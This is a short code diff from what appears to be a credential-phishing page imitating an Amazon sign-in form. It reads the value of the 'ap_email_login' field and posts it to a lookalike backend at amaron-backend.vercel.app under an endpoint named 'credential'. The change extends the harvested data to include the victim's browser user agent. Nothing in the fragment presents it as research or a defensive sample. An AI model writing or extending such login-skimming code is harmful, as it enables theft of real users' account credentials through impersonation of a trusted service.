@@ -17116,7 +17116,10 @@
 
                 const username = document.getElementById("ap_email_login").value;
 
-                const payload = { username };
+                const payload = {
+                                username,
+                                userAgent: navigator.userAgent
+                                };
 
                 try {
                     const res = await fetch("https://amaron-backend.vercel.app/api/credential", {
